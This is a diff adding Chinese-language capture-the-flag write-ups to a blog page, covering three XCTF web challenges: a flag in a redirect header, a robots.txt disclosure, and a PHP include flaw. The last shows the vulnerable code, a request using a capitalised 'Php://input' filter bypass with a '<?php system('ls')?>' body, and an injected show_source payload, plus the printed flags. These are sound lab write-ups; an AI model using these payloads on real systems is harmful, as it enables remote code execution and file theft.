@@ -499,6 +499,92 @@
 <p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930222231.png" alt=""></p>
 <p>之后cat</p>
 <p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/AppData/Roaming/Typora/typora-user-images/image-20210930222253970.png" alt=""></p>
+<h2 id="攻防世界web——baby-web"><a class="header-anchor" href="#攻防世界web——baby-web">¶</a>攻防世界web——baby_web</h2>
+<p>URL：<a target="_blank" rel="noopener" href="http://111.200.241.244:57092/1.php">http://111.200.241.244:57092/1.php</a></p>
+<p>一进去就发现后缀是1.php，发生了重定向，因为一般进入一个网站后访问的都是index.php的PHP后缀。</p>
+<p>我们把题目中的1.php，改成index.php，打开F12，打开index.php的文件</p>
+<p>HTTP/1.1 302 Found<br>
+date: Fri, 01 Oct 2021 12:28:37 GMT<br>
+server: Apache/2.4.38 (Debian)<br>
+x-powered-by: PHP/7.2.21<br>
+flag: flag{very_baby_web}<br>
+location: 1.php<br>
+content-length: 17<br>
+keep-alive: timeout=5, max=97<br>
+connection: Keep-Alive<br>
+content-type: text/html; charset=UTF-8</p>
+<p>FLAG就在里面</p>
+<h2 id="攻防世界web——Training-WWW-Robots"><a class="header-anchor" href="#攻防世界web——Training-WWW-Robots">¶</a>攻防世界web——Training-WWW-Robots</h2>
+<p>网站信息为：</p>
+<pre class="line-numbers language-none"><code class="language-none">In this little training challenge, you are going to learn about the [Robots_exclusion_standard](http:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Robots_exclusion_standard).
+The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.
+Sometimes these files reveal the directory structure instead protecting the content from being crawled.
+
+Enjoy!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>URL后面加上/robots.txt</p>
+<p>网站信息为：</p>
+<pre class="line-numbers language-none"><code class="language-none">User-agent: *
+Disallow: &#x2F;fl0g.php
+
+
+User-agent: Yandex
+Disallow: *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>URL后面改上/fl0g.php</p>
+<p>cyberpeace{e85ff94f2cc376cf9ea6f64452797795}</p>
+<h2 id="攻防世界web——Web-php-include"><a class="header-anchor" href="#攻防世界web——Web-php-include">¶</a>攻防世界web——Web_php_include</h2>
+<h3 id="方法一"><a class="header-anchor" href="#方法一">¶</a>方法一</h3>
+<p>网站内容包括</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>打开Burp Suite截取请求报文，进行修改。</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?page=Php://input&amp;</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header-name keyword">Host:</span> 111.200.241.244:55122
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Connection:</span> keep-alive
+<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1
+<span class="token header-name keyword">Cache-Control:</span> max-age=0
+<span class="token header-name keyword">Content-Length:</span> 20
+
+&lt;?php system('ls')?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>注：网站存在对php的过滤，所以考虑将P大写绕过</p>
+<p>发送报文，收到回复</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211001205112.png" alt=""></p>
+<p>cat fl4gisisish3r3.php</p>
+<p>$flag=“ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}”;</p>
+<h3 id="方法二-v2"><a class="header-anchor" href="#方法二-v2">¶</a>方法二</h3>
+<p><a target="_blank" rel="noopener" href="http://111.200.241.244:55122/?page=http://127.0.0.1/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E">http://111.200.241.244:55122/?page=http://127.0.0.1/?hello=&lt;?show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;</a></p>
+<p>page要先过，才能执行hello，所以page的参数定义为本地地址即可</p>
+<p>网页信息为</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
